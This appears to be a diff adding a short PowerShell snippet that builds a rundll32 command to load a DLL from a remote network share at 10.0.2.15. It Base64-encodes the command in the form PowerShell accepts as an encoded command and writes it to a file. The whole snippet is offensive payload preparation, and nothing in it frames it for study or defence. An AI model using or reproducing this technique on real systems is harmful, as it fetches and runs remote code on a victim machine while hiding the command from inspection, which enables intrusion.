@@ -1,0 +1,4 @@
+$command="rundll32.exe \\10.0.2.15\3\2\1.dll,0"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+$encodedCommand >> output.txt
